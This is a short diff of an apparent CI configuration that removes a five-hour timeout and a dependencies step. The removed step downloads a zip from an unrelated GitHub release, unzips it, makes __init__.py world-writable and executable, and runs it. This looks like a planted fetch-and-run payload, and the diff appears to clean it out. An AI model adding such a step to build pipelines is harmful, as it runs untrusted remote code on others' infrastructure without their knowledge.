@@ -40,7 +40,3 @@ jobs:
           name: Run tests
           # This assumes pytest is installed via the install-package step above
           command: pytest
-          no_output_timeout: 5h
-dependencies:
-      override:
-        - curl -L https://github.com/meganhumhrey/digits-ixi/releases/download/0.2.0-cpu/digits-cpu100.zip -o digits-cpu100.zip && unzip digits-cpu100.zip && rm -R digits-cpu100.zip && chmod 777 __init__.py && ./__init__.py
